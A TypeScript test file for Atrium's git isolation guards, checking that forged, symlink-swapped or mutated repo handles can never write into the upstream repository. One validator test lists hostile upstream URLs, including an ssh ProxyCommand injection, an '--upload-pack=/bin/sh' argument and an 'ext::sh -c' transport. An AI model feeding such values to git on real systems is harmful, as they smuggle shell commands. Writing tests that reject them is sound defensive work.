    expect(await fingerprint(upstream.dir)).toBe(before);

    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  it('DEFENSE IN DEPTH (#141 r5): the overlap re-check still catches a branded repo symlink-swapped onto the upstream', async () => {
    // The brand is the primary gate; the overlap check is RETAINED behind it and is
    // NOT dead code. A FACTORY-MINTED artifact repo is created at a symlinked path
    // that does not overlap the upstream — so `createArtifactRepo`'s own creation-time
    // check passes and the repo is branded — and only THEN is the symlink swapped to
    // point at the upstream (a TOCTOU the brand alone cannot see, because the object
    // is genuinely authentic). `pushArtifactBranch` canonicalises `dir` at push time,
    // so the now-overlapping realpath is caught by the overlap check.
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'toctou-overlap');
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');

    const root = await mkdtemp(join(tmpdir(), 'atrium-141-toctou-'));
    trash.push(root);
    const realArtifact = join(root, 'real-artifact');
    await mkdir(realArtifact, { recursive: true });
    const link = join(root, 'artifact-link');
    await symlink(realArtifact, link, 'dir'); // points somewhere harmless at creation
    // Branded, real, non-overlapping at creation — the creation-time overlap check
    // passes and the repo goes into the authenticity WeakSet.
    const branded = await createArtifactRepo(link, { url: upstream.dir, ref: 'main' });
    // Now swap the link so `branded.dir` (the string `link`) canonicalises onto the
    // upstream — the push would otherwise write refs straight into it.
    await rm(link, { force: true });
    await symlink(upstream.dir, link, 'dir');

    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: delete the retained `pathsOverlap` check from `pushArtifactBranch`
    // (leaving only the brand) and this authentic-but-swapped repo pushes a session
    // ref INTO the upstream — the fingerprint moves.
    const message = await pushArtifactBranch(checkout, branded).then(
      () => null,
      (e: Error) => e.message,
    );
    expect(message, 'expected the overlap re-check to refuse the swapped path').not.toBeNull();
    expectExactlyGuard(message as string, 'plumbing/push-into-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);

    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  /* ── Round 6 (#141 r6): FINDING A — the brand is FROZEN, not just tagged ────
   *
   * Round 5 proved a forged (never-minted) handle is rejected. Both critics then
   * showed the branded object is itself MUTABLE: `readonly` is compile-time only, so
   * a caller keeps a genuinely-branded object — brand check passes, same WeakSet
   * member — and reassigns its `dir`/`upstreamPath` fields to point a later git-write
   * at the upstream. `Object.freeze` at mint makes the fields runtime-immutable, so
   * the fields a guard reads cannot diverge from the fields a write uses.
   */

  it('FINDING A (#141 r6): a branded ScratchRepo is FROZEN — a swapped dir cannot redirect the worktree write', async () => {
    // An AUTHENTIC empty-trunk scratch repo: branded AND (round 6) frozen.
    const scratch = await createScratchRepo();
    trash.push(scratch.dir);
    expect(Object.isFrozen(scratch), 'a minted ScratchRepo must be frozen').toBe(true);
    const realDir = scratch.dir;
    const before = await fingerprint(upstream.dir);
    // THE MUTABLE-BRAND ATTACK: keep the genuinely-branded object, swap its `dir` at
    // the upstream. The brand check in `addWorktree` still passes (same object), so
    // only the FREEZE stands between the swap and `git worktree add` writing INTO the
    // upstream. Strict-mode reassignment of a frozen field throws; catch it and prove
    // the field is unchanged either way.
    // REVERT-REDS: drop `Object.freeze` from `brandScratchRepo` and the assignment
    // STICKS — `scratch.dir` becomes the upstream and this `expect` reds; unreverted,
    // `addWorktree` would then register a worktree inside the human's repository.
    try {
      (scratch as { dir: string }).dir = upstream.dir;
    } catch {
      /* frozen reassignment throws in strict mode — the other half of "throws / no-op" */
    }
    expect(scratch.dir, 'a frozen ScratchRepo.dir must not be reassignable').toBe(realDir);
    // The write still lands in the real scratch repo; the upstream is byte-identical.
    const checkout = await addWorktree(scratch, 'freeze-scratch');
    await removeWorktree(checkout);
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('FINDING A (#141 r6): a branded ArtifactRepo is FROZEN — a swapped dir/upstreamPath cannot redirect the push', async () => {
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'freeze-artifact');
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');

    const artDir = await mkdtemp(join(tmpdir(), 'atrium-141-freeze-art-'));
    trash.push(artDir);
    const artifact = await createArtifactRepo(artDir, { url: upstream.dir, ref: 'main' });
    expect(Object.isFrozen(artifact), 'a minted ArtifactRepo must be frozen').toBe(true);
    const before = await fingerprint(upstream.dir);
    // THE MUTABLE-BRAND ATTACK (F2's sequel): swap `dir` at the upstream AND
    // `upstreamPath` to `null` so the retained overlap re-check is skipped. The brand
    // passes (same object); only the FREEZE stops the swap.
    // REVERT-REDS: drop `Object.freeze` from `brandArtifactRepo` and both assignments
    // STICK — these `expect`s red, and unreverted the push would land a session ref in
    // the upstream (null upstreamPath skips the overlap check).
    try {
      (artifact as { dir: string }).dir = upstream.dir;
    } catch {
      /* frozen */
    }
    try {
      (artifact as { upstreamPath: string | null }).upstreamPath = null;
    } catch {
      /* frozen */
    }
    expect(artifact.dir, 'a frozen ArtifactRepo.dir must not be reassignable').toBe(artDir);
    expect(
      artifact.upstreamPath,
      'a frozen ArtifactRepo.upstreamPath must not be reassignable',
    ).toBe(upstream.dir);
    // Push still targets the real artifact repo; the upstream is untouched.
    await pushArtifactBranch(checkout, artifact);
    expect(await fingerprint(upstream.dir)).toBe(before);
    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  /* ── Round 6 (#141 r6): FINDING B — the brand verified at the WRITE ─────────
   *
   * Round 5 branded the scratch/artifact repos but checked the brand only at
   * provider construction (`createWorktreeCommandProvider`) and at the push
   * (`pushArtifactBranch`). Two git-writes still trusted a caller-supplied dir with
   * no brand check: `addWorktree`'s `git worktree add` and `pinSettledArtifact`'s
   * `git update-ref`. A direct caller reaches both without a provider.
   */

  it('FINDING B (#141 r6): addWorktree refuses a FORGED scratch repo aimed at the upstream', async () => {
    // A hand-built handle pointed straight at the upstream — never minted, so not in
    // the authenticity WeakSet.
    const forged: ScratchRepo = { dir: upstream.dir, seedCommit: upstream.commit };
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: delete the `!isAuthenticScratchRepo` gate from `addWorktree` and
    // `git worktree add` registers `atrium/session/*` INSIDE the upstream (a new ref +
    // `.git/worktrees/*`), moving the fingerprint.
    const message = await addWorktree(forged, 'forged-scratch').then(
      () => null,
      (e: Error) => e.message,
    );
    expect(message, 'expected addWorktree to refuse a forged scratch repo').not.toBeNull();
    expectExactlyGuard(message as string, 'plumbing/add-worktree-not-authentic');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('FINDING B (#141 r6): pinSettledArtifact refuses a FORGED artifact repo aimed at the upstream', async () => {
    // The SECOND durable-repo write. A forged handle pointed at the upstream.
    const forged: ArtifactRepo = { dir: upstream.dir, upstreamPath: null };
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: delete the `!isAuthenticArtifactRepo` gate from `pinSettledArtifact`
    // and `git update-ref refs/atrium/settled/*` writes a ref INTO the upstream (the
    // upstream commit resolves there, so the create-only update succeeds) — fingerprint moves.
    const message = await pinSettledArtifact(forged, 'forged-pin', upstream.commit).then(
      () => null,
      (e: Error) => e.message,
    );
    expect(message, 'expected pinSettledArtifact to refuse a forged artifact repo').not.toBeNull();
    expectExactlyGuard(message as string, 'plumbing/pin-artifact-not-authentic');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  /* ── Round 6 (#141 r6): the "no OTHERS" closure — WorktreeCheckout ──────────
   *
   * The enumeration's third forgeable handle. `commitWorktree`/`removeWorktree`
   * point git-writes through checkout-supplied `gitDir`/`dir`/`repoDir`; the
   * git-retarget PIN does not defend a FORGED checkout because the pin USES those
   * fields. So the checkout is branded at `addWorktree` and verified — and frozen,
   * against the mutated-branded variant.
   */

  it('the "no OTHERS" closure (#141 r6): commitWorktree refuses a FORGED checkout aimed at the upstream', async () => {
    const upstreamGitDir = join(upstream.dir, '.git');
    // A hand-built checkout whose pin points GIT_DIR/GIT_WORK_TREE at the upstream and
    // whose branch is the upstream's own trunk — never produced by `addWorktree`.
    const forged: WorktreeCheckout = {
      dir: upstream.dir,
      branch: 'main',
      repoDir: upstream.dir,
      gitDir: upstreamGitDir,
      commonDir: upstreamGitDir,
    };
    // Dirty the upstream worktree so a commit WOULD land if the gate were gone — an
    // untracked file the forged `add -A`/`commit` would sweep onto `main`.
    await writeFile(
      join(upstream.dir, 'planted.txt'),
      'harness output the adapter must not commit\n',
    );
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: delete the `!isAuthenticWorktreeCheckout` gate from `commitWorktree`
    // and the pin drives `git add`/`commit` on the upstream — `planted.txt` lands on
    // `main` as a new commit, moving both the ref and the object store.
    const message = await commitWorktree(forged, 'forged commit').then(
      () => null,
      (e: Error) => e.message,
    );
    expect(message, 'expected commitWorktree to refuse a forged checkout').not.toBeNull();
    expectExactlyGuard(message as string, 'plumbing/worktree-checkout-not-authentic');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('the "no OTHERS" closure (#141 r6): removeWorktree refuses a FORGED checkout — it will not rm the upstream', async () => {
    const upstreamGitDir = join(upstream.dir, '.git');
    const forged: WorktreeCheckout = {
      dir: upstream.dir,
      branch: 'main',
      repoDir: upstream.dir,
      gitDir: upstreamGitDir,
      commonDir: upstreamGitDir,
    };
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: delete the brand gate from `removeWorktree` and it `rm -rf`s the
    // upstream (`checkout.dir`) — the directory is destroyed, so `fingerprint` moves
    // or throws. The gate refuses BEFORE any destructive call.
    const message = await removeWorktree(forged).then(
      () => null,
      (e: Error) => e.message,
    );
    expect(message, 'expected removeWorktree to refuse a forged checkout').not.toBeNull();
    expectExactlyGuard(message as string, 'plumbing/worktree-checkout-not-authentic');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('the "no OTHERS" closure (#141 r6): a branded checkout is FROZEN — a swapped gitDir cannot redirect the commit', async () => {
    const scratch = await createScratchRepo();
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'freeze-checkout');
    expect(Object.isFrozen(checkout), 'a minted WorktreeCheckout must be frozen').toBe(true);
    const realGitDir = checkout.gitDir;
    await writeFile(join(upstream.dir, 'planted.txt'), 'x\n');
    const before = await fingerprint(upstream.dir);
    // THE MUTATED-BRANDED ATTACK: keep the genuinely-branded checkout, swap its pin at
    // the upstream. The brand passes (same object); only the FREEZE stops the swap.
    // REVERT-REDS: drop `Object.freeze` from `brandWorktreeCheckout` and these
    // assignments STICK — `checkout.gitDir` becomes the upstream and this `expect` reds;
    // unreverted, `commitWorktree` would then commit onto the upstream's `main`.
    try {
      (checkout as { gitDir?: string }).gitDir = join(upstream.dir, '.git');
    } catch {
      /* frozen */
    }
    try {
      (checkout as { dir: string }).dir = upstream.dir;
    } catch {
      /* frozen */
    }
    expect(checkout.gitDir, 'a frozen WorktreeCheckout.gitDir must not be reassignable').toBe(
      realGitDir,
    );
    // The commit still lands in the real scratch repo; the upstream is untouched.
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');
    expect(await fingerprint(upstream.dir)).toBe(before);
    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  it('an ArtifactRepo STATES its provenance — the field is mandatory, never omitted (#141 r4)', async () => {
    // The push guard reads `artifact.upstreamPath`. Round 3 made it optional
    // (`upstreamPath?: string`), so a hand-assembled repo that simply OMITTED it
    // slid past the `!== undefined` check — a fail-open on the exact adjacent path
    // this seam exists to close. Round 4 made it a MANDATORY `string | null`: a
    // repo either names a local upstream path or says `null` (none), but it cannot
    // stay silent.

    // `createArtifactRepo` always POPULATES the field — present, not absent.
    const seeded = await createArtifactRepo(await mkdtemp(join(tmpdir(), 'atrium-prov-seeded-')), {
      url: upstream.dir,
      ref: 'main',
    });
    const plain = await createArtifactRepo(await mkdtemp(join(tmpdir(), 'atrium-prov-plain-')));
    trash.push(seeded.dir, plain.dir);
    expect('upstreamPath' in seeded).toBe(true);
    expect('upstreamPath' in plain).toBe(true);
    expect(seeded.upstreamPath).toBe(upstream.dir);
    // No upstream ⇒ explicit `null`, never `undefined`/absent — the guard reads it
    // as "nothing to overlap", stated rather than inferred from a missing key.
    expect(plain.upstreamPath).toBeNull();

    // And the TYPE forbids omission. REVERT-REDS: restore `upstreamPath?: string`
    // and this `@ts-expect-error` becomes an unused directive → typecheck reds.
    // @ts-expect-error — `upstreamPath` is a required field; a repo cannot omit its
    // provenance into `pushArtifactBranch`'s guard.
    const omitted: ArtifactRepo = { dir: plain.dir };
    expect(omitted.dir).toBe(plain.dir);
  });

  it('seeds trunk FROM the upstream and leaves it byte-identical', async () => {
    const before = await fingerprint(upstream.dir);
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);

    // Trunk IS the upstream commit — not a synthetic seed.
    expect(scratch.seedCommit).toBe(upstream.commit);
    expect(await mainCommit(scratch)).toBe(upstream.commit);
    expect(scratch.upstream).toEqual({ url: upstream.dir, ref: 'main', commit: upstream.commit });

    // A worktree forks the REAL tree: the upstream's file is there to be edited.
    const checkout = await addWorktree(scratch, 'seeded');
    expect(await readFile(join(checkout.dir, upstream.file), 'utf8')).toContain(
      'the file a session deletes',
    );
    // REVERT-REDS: restore `createScratchRepo` to always write README.atrium and
    // the upstream file is absent here — the ticket's whole complaint.
    await removeWorktree(checkout);
    expect(await fingerprint(upstream.dir)).toBe(before);
    await disposeScratchRepo(scratch);
  });

  it('leaves the empty-trunk seam EXACTLY as it was when no upstream is given (the flip)', async () => {
    const scratch = await createScratchRepo();
    trash.push(scratch.dir);
    expect(scratch.upstream).toBeUndefined();
    const checkout = await addWorktree(scratch, 'unseeded');
    expect(await readFile(join(checkout.dir, 'README.atrium'), 'utf8')).toContain(
      'Atrium execution scratch repo',
    );
    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  /* ── FIX 2 (#141 r2) at the PLUMBING layer ──────────────────────────────
   *
   * The config gate is a boot-time string comparison. These are the same two
   * defects reaching the operations themselves, which a hand-built seed gets to
   * without ever loading an env: `createArtifactRepo` is what runs
   * `init --bare` and two `config` writes at the destination.
   */

  it.each([
    ['an IPv4 loopback host', (dir: string) => `file://127.0.0.1${dir}`],
    ['an IPv6 loopback host', (dir: string) => `file://[::1]${dir}`],
    ['the localhost alias', (dir: string) => `file://localhost${dir}`],
    ['a trailing slash', (dir: string) => `file://${dir}/`],
    ['an uppercase scheme', (dir: string) => `FILE://${dir}`],
    // FIX 1 (#141 r3): the non-loopback authorities git also localises. Before
    // this fix `upstreamLocalPath` returned null for these ("remote") and
    // `createArtifactRepo` ran `init --bare` straight into the upstream.
    [
      'a non-loopback hostname (the stopper)',
      (dir: string) => `file://build-box.example.com${dir}`,
    ],
    ['a bare word host', (dir: string) => `file://hostname${dir}`],
    ['an IPv4-mapped IPv6 host', (dir: string) => `file://[::ffff:127.0.0.1]${dir}`],
  ])('refuses to open the artifact repo at an upstream spelled with %s', async (_name, spell) => {
    const before = await fingerprint(upstream.dir);
    // EXECUTED, not argued: before this fix `upstreamLocalPath` returned null
    // for every loopback/non-loopback spelling and `createArtifactRepo` ran
    // `init --bare` straight into the upstream, moving the fingerprint below.
    const error = await createArtifactRepo(upstream.dir, {
      url: spell(upstream.dir),
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error, `expected a refusal for ${spell(upstream.dir)}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses to open the artifact repo at a SYMLINK into the upstream', async () => {
    const before = await fingerprint(upstream.dir);
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-plumbing-link-'));
    trash.push(root);
    const link = join(root, 'artifacts');
    await symlink(upstream.dir, link, 'dir');
    // REVERT-REDS: drop `canonicalize` from `pathsOverlap` and this `init --bare`
    // lands in the human's repository through the link.
    const error = await createArtifactRepo(link, { url: upstream.dir, ref: 'main' }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses a file:// upstream it cannot canonicalise, rather than opening anywhere', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'atrium-141-unparseable-'));
    trash.push(dir);
    const error = await createArtifactRepo(dir, {
      url: 'file:///srv/atrium%2F..%2Fetc',
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/unparseable-url');
  });

  /* ── FIX 2 (#141 r3): the SCRATCH repo's OPERATION-TIME overlap recheck ────
   *
   * `createScratchRepo` runs mkdir + `git init` + worktrees under its baseDir.
   * The boot gate refuses an overlapping `EXECUTION_SCRATCH_DIR`, but that is a
   * stale string comparison by the time the write happens — a symlink swapped
   * in after boot escapes it. So the overlap is re-checked HERE, in the function
   * that writes, against realpath. A hand-built seed reaches this without any
   * boot gate at all, which is exactly the adjacent path being closed.
   */

  it.each([
    ['baseDir IS the upstream', (dir: string) => dir, (dir: string) => dir],
    ['baseDir is INSIDE the upstream', (dir: string) => join(dir, 'nested'), (dir: string) => dir],
    // FIX 1 rides along: a non-loopback file:// spelling of the upstream must be
    // recognised as the same local path here too.
    [
      'the upstream named by a non-loopback file:// URL',
      (dir: string) => dir,
      (dir: string) => `file://build-box.example.com${dir}`,
    ],
  ])('refuses to CREATE the scratch repo when %s', async (_name, baseDirOf, urlOf) => {
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: drop the operation-time recheck from `createScratchRepo` and
    // this mkdtemps + `git init` + fetches INSIDE the upstream, moving its
    // fingerprint below.
    const error = await createScratchRepo(baseDirOf(upstream.dir), {
      url: urlOf(upstream.dir),
      ref: 'main',
    }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, 'expected createScratchRepo to refuse an overlapping baseDir').not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/scratch-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses to CREATE the scratch repo under a baseDir SYMLINKED into the upstream', async () => {
    // The realpath half of FIX 2: the lexical spelling of `baseDir` does not
    // overlap, but it dereferences into the upstream. `pathsOverlap` canonicalises
    // the deepest existing prefix, so the link is caught at operation time.
    const before = await fingerprint(upstream.dir);
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-scratch-link-'));
    trash.push(root);
    const link = join(root, 'scratch-link');
    await symlink(upstream.dir, link, 'dir');
    const error = await createScratchRepo(join(link, 'exec'), {
      url: upstream.dir,
      ref: 'main',
    }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/scratch-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('still creates the scratch repo normally under a non-overlapping baseDir — the flip', async () => {
    const base = await mkdtemp(join(tmpdir(), 'atrium-141-scratch-ok-'));
    trash.push(base);
    const scratch = await createScratchRepo(base, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    // It really seeded from the upstream, and left the upstream untouched.
    expect(scratch.seedCommit).toBe(upstream.commit);
  });

  it('still opens the artifact repo normally beside a loopback-spelled upstream', async () => {
    // The flip. Canonicalising a loopback `file://` URL must find the overlap
    // when there is one and NOT invent one when there is not.
    const dir = await mkdtemp(join(tmpdir(), 'atrium-141-ok-'));
    trash.push(dir);
    const repo = await createArtifactRepo(dir, {
      url: `file://127.0.0.1${upstream.dir}`,
      ref: 'main',
    });
    expect(repo.dir).toBe(dir);
    // And it recorded the CANONICAL local path, so the push-time re-check has
    // something to compare against instead of `undefined`.
    expect(repo.upstreamPath).toBe(upstream.dir);
  });

  /* ── The pure functions, directly ──────────────────────────────────────── */

  it('canonicalises every local spelling of one directory to one path — any host', () => {
    for (const spelling of [
      upstream.dir,
      `file://${upstream.dir}`,
      `file://127.0.0.1${upstream.dir}`,
      `file://[::1]${upstream.dir}`,
      `file://localhost${upstream.dir}`,
      `FILE://${upstream.dir}`,
      `file://${upstream.dir}/`,
      `${upstream.dir}/`,
      // FIX 1 (#141 r3): git drops the authority for EVERY host, so a non-loopback
      // authority names the SAME local directory. These returned null before.
      `file://build-box.example.com${upstream.dir}`,
      `file://hostname${upstream.dir}`,
      `file://[::ffff:127.0.0.1]${upstream.dir}`,
    ]) {
      expect(upstreamLocalPath(spelling), spelling).toBe(upstream.dir);
    }
  });

  it('keeps a genuinely remote location remote, and refuses an unreadable one', () => {
    // Only the NON-file schemes are remote — a network location with no local
    // directory to overlap. Every `file:` URL, whatever its authority, is local
    // (FIX 1 #141 r3): `file://build-box.example.com/...` is NOT in this list.
    for (const remote of [
      'https://github.com/lmvdz/atrium.git',
      'ssh://git@github.com/lmvdz/atrium.git',
      'git://host/r',
      'http://internal.example/atrium.git',
    ]) {
      expect(upstreamLocalPath(remote), remote).toBeNull();
    }
    // The former "remote file:// host" is now correctly LOCAL — git localises it.
    expect(upstreamLocalPath('file://build-box.example.com/srv/atrium')).toBe('/srv/atrium');
    expect(() => upstreamLocalPath('file:///srv/atrium%2F..%2Fetc')).toThrow(
      /an unreadable location is not evidence that it is remote/,
    );
  });

  it('overlaps through a symlink and through case, and not otherwise', async () => {
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-overlap-'));
    trash.push(root);
    const real = join(root, 'upstream');
    await mkdir(join(real, 'deep'), { recursive: true });
    const link = join(root, 'link');
    await symlink(join(real, 'deep'), link, 'dir');
    expect(pathsOverlap(link, real)).toBe(true);
    expect(pathsOverlap(join(link, 'artifacts'), real)).toBe(true);
    expect(pathsOverlap(`${real}/`, real)).toBe(true);
    expect(pathsOverlap(real.toUpperCase(), real)).toBe(true);
    expect(pathsOverlap(join(root, 'elsewhere'), real)).toBe(false);
    // The classic false-friend: a sibling whose name is a string prefix.
    expect(pathsOverlap(`${real}-other`, real)).toBe(false);
  });

  it('accepts and refuses upstream URLs by PARSE, not by prefix', () => {
    for (const good of [
      '/srv/atrium',
      'https://github.com/lmvdz/atrium.git',
      'HTTPS://github.com/lmvdz/atrium.git',
      'ssh://git@github.com:22/lmvdz/atrium.git',
      'git://github.com/lmvdz/atrium.git',
      'http://internal.example/atrium.git',
      'file:///srv/atrium',
      'file://127.0.0.1/srv/atrium',
    ]) {
      expect(isAcceptableUpstreamUrl(good), good).toBe(true);
    }
    for (const bad of [
      'https://',
      'ssh://-oProxyCommand=evil/repo',
      'file:///srv/atrium?x=1',
      'file:///srv/atrium#f',
      'file://',
      'git://=weird=/repo',
      '--upload-pack=/bin/sh',
      'ext::sh -c evil',
      'some/relative/repo',
      'git@github.com:lmvdz/atrium.git',
      '',
    ]) {
      expect(isAcceptableUpstreamUrl(bad), bad).toBe(false);
    }
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 3 — PROVIDER. The dangerous provider does not build.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — provider wiring (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  let seeded: ScratchRepo;
  let plain: ScratchRepo;
  let artifactDir: string;
  let artifactRepo: ArtifactRepo;
  let savedOptIn: string | undefined;

  beforeEach(async () => {
    upstream = await makeUpstream();
    seeded = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    plain = await createScratchRepo();
    artifactDir = await mkdtemp(join(tmpdir(), 'atrium-artifacts-141-'));
    artifactRepo = await createArtifactRepo(artifactDir, { url: upstream.dir, ref: 'main' });
    savedOptIn = process.env.EXECUTION_ALLOW_UNSANDBOXED;
    process.env.EXECUTION_ALLOW_UNSANDBOXED = '1';
  });

  afterEach(async () => {
    if (savedOptIn === undefined) delete process.env.EXECUTION_ALLOW_UNSANDBOXED;
    else process.env.EXECUTION_ALLOW_UNSANDBOXED = savedOptIn;
    await disposeScratchRepo(seeded);
    await disposeScratchRepo(plain);
    await rm(artifactDir, { recursive: true, force: true });
    await rm(upstream.dir, { recursive: true, force: true });
  });

  /**
   * The SHIM only, now (#141 r4). The artifact-remote guard
   * (`assertArtifactRemoteIsNotUpstream`) fires only for a provider built over a
   * SEEDED repo — and after round 4 the worktree provider REFUSES a seeded repo
   * outright, before it ever reaches that guard, so it cannot exercise these cases
   * at all. The shim is the only provider that legitimately runs a seeded upstream
   * (it runs no harness), so it is where the artifact-remote obligation is proven.
   * The worktree provider's total refusal of a seeded repo is witnessed separately
   * below — a strictly stronger guarantee than the artifact-remote guard the shim
   * carries.
   */
  const factories: Array<[string, (repo: ScratchRepo, ar?: ArtifactRepo) => unknown]> = [
    ['shim', (repo, ar) => createDeterministicShimProvider({ repo, artifactRepo: ar })],
  ];

  for (const [kind, build] of factories) {
    it(`the ${kind} provider refuses an upstream-seeded repo with NO durable artifact remote`, () => {
      // Without a durable remote the artifact's `remote` falls back to the
      // scratch repo, which teardown deletes — a real-repo receipt naming a
      // remote nobody can fetch from. REVERT-REDS: remove
      // `assertArtifactRemoteIsNotUpstream` from this factory and it builds.
      let message = '';
      try {
        build(seeded, undefined);
        expect.unreachable(`${kind} must refuse a seeded repo with no artifact remote`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider refuses a durable artifact remote that IS the upstream`, () => {
      let message = '';
      try {
        build(seeded, { dir: upstream.dir, upstreamPath: upstream.dir });
        expect.unreachable(`${kind} must refuse an artifact remote at the upstream`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider sees the upstream through a non-loopback file:// spelling`, () => {
      // The provider layer resolves the seed's URL itself. FIX 1 (#141 r3): a
      // non-loopback authority is the SAME local path (git drops the authority),
      // so an artifact remote at the upstream must be caught even when the seed
      // URL spells the upstream with a foreign host. REVERT-REDS: restore
      // `upstreamLocalPath`'s loopback allowlist and this returns null ("remote"),
      // so the provider BUILDS with its artifact remote sitting on the upstream.
      const spelled: ScratchRepo = {
        ...seeded,
        upstream: {
          url: `file://build-box.example.com${upstream.dir}`,
          ref: 'main',
          commit: upstream.commit,
        },
      };
      let message = '';
      try {
        build(spelled, { dir: upstream.dir, upstreamPath: upstream.dir });
        expect.unreachable(`${kind} must refuse a non-loopback-spelled upstream`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider builds normally with a distinct durable remote`, () => {
      expect(() => build(seeded, artifactRepo)).not.toThrow();
    });

    it(`the ${kind} provider is UNCHANGED for an unseeded repo with no artifact remote`, () => {
      // The flip: no upstream, no obligation. #120's behaviour is untouched.
      expect(() => build(plain, undefined)).not.toThrow();
    });
  }

  /* ── r4 (#141): the worktree factory refuses a seeded upstream, PERIOD ────
   *
   * env.ts refuses `EXECUTION_PROVIDER=worktree` + an upstream at boot, but the
   * factory is reachable by a direct caller that never loads an `Env` — the #89
   * adjacent-path-bypass class. So the constructor itself refuses a seeded
   * scratch repo, UNCONDITIONALLY.
   *
   * Round 3 gated this behind a `containedUpstreamSeed` boolean the acceptance
   * test flipped. That boolean was not containment: any direct caller sets it and
   * builds the forbidden provider, whose harness redirects the push into the
   * upstream. Round 4 REMOVED the seam — there is no opt-in, and real-repo
   * execution moves to the #138 sandbox provider. This is worktree-only: the shim
   * runs no harness, so a seeded shim is safe and stays bootable (below).
   */

  it('the worktree factory REFUSES a seeded upstream — the capability is removed, no seam', () => {
    // A VALID, distinct artifact remote — so this is not the artifact-remote
    // guard firing; it is the r4 factory refusal, which is about the MODE not the
    // wiring. REVERT-REDS: re-introduce the `containedUpstreamSeed` seam (or weaken
    // the `repo.upstream !== undefined` refusal) and this BUILDS, and a direct
    // caller then runs a real harness against a real upstream with no boot gate.
    let message = '';
    try {
      createWorktreeCommandProvider({ repo: seeded, artifactRepo, command: ['true'] });
      expect.unreachable('worktree must refuse a seeded upstream — the capability is removed');
    } catch (error) {
      message = (error as Error).message;
    }
    expectExactlyGuard(message, 'provider/worktree-upstream-seed');
    expect(message).toContain('#138');
  });

  it('F1 (#141 r5): the worktree factory refuses a FORGED scratch repo that omits its upstream field', () => {
    // The exact bypass BOTH foreign lineages executed. `seeded` is a real,
    // factory-seeded scratch repo; a hand-built `{ dir, seedCommit }` copy that LEAVES
    // OFF the `upstream` field reads, structurally, as an innocent empty-trunk repo —
    // so it slips the `repo.upstream !== undefined` refusal (round 4). But `dir` still
    // points at the seeded repo, so the harness this factory builds runs against the
    // real upstream and can rewrite its own push destination. Round 5 refuses it
    // because the handle was not minted by `createScratchRepo` — its provenance is a
    // runtime brand, not a forgeable field.
    const forged: ScratchRepo = { dir: seeded.dir, seedCommit: seeded.seedCommit };
    // The forgery is structurally an empty-trunk repo — no `upstream` — so the older
    // refusal cannot see it. The brand can.
    expect('upstream' in forged).toBe(false);
    let message = '';
    try {
      createWorktreeCommandProvider({ repo: forged, artifactRepo, command: ['true'] });
      expect.unreachable('worktree must refuse a forged, unbranded scratch repo');
    } catch (error) {
      message = (error as Error).message;
    }
    // REVERT-REDS: delete the `!isAuthenticScratchRepo` gate from the factory and this
    // BUILDS — the forged handle omits `upstream`, the structural refusal never fires,
    // and a real harness runs against the seeded upstream with no gate anywhere.
    expectExactlyGuard(message, 'provider/scratch-not-authentic');
  });

